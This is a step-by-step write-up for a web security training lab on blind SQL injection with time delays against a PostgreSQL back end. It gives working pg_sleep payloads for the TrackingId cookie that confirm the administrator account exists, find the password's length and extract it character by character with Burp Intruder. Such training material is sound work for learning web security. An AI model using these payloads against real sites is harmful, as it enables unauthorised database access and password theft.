# SQL Injection Lab 15 - Blind SQL injection with time delays and information retrieval

## Manual Solution

### 1. Access the Lab
- Access the Web Security Academy lab.

### 2. Initial Setup
- Open Burp Suite and intercept a GET request to the website.
- Send the captured request to the Repeater for testing.

### 3. Add the time delay payload to the trackingId parameter
- TrackingId=a`' || (SELECT pg_sleep(10))--`
- pg_sleep(10) is a function that sleeps for 10 seconds.
- || is the string concatenation operator in PostgreSQL that allows chaining multiple SQL expressions

### 4. Add the information retrieval payload to the trackingId parameter
- TrackingId=a`' || (SELECT CASE WHEN EXISTS (SELECT username FROM users WHERE username = 'administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END) --`
- This payload checks if the username 'administrator' exists in the users table.

### 5. Determine the password length
- Add trackingID parameter: TrackingId=a`' || (SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username = 'administrator') < 1 THEN pg_sleep(10) ELSE pg_sleep(0) END) -- `
- Use Intruder with:
    * Payload position: `1`
    * Payload type: Numbers (1-60)
- You can analyze the response to determine the password length.

### 6. Append the trackingId parameter to the request
- TrackingId=a`' OR (SELECT CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator') = 'a' THEN pg_sleep(10) ELSE pg_sleep(0) END) --` 
- Then send the request to the intruder.
     * First position: `SUBSTRING(password,[position],1)`
       - Payload type: Numbers (1 to password length)
     * Second position: Character to test
       - Payload type: Brute forcer (a-z, 0-9)

### 7. Send the request
- Send the request to the Repeater.
- You will see the congratulations message after 10 seconds.

## Automated Solution

### 1. Download the script
### 2. Run the script with the following command: python sqli_lab_15.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)

